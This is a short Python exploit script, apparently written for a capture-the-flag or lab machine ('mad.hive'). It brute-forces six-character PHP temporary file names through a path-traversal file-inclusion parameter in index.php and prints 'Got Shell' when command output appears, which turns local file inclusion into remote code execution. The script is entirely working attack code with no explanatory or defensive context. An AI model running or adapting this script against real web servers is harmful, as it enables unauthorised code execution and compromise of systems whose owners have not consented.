import itertools
import sys
import string
import requests

print('[+++] Bruteforcing bub!')
for fname in itertools.permutations(string.ascii_letters + string.digits, 6):
    name= ''.join(fname)
    print('[++] ' + name)
    url = 'http://mad.hive/index.php?file=../../../../tmp/php' + name
    g = requests.get(url)
    if 'load average' in g.text:
        print('[+] Got Shell: ' + url + ' :yeah you do!')
        sys.exit(0)
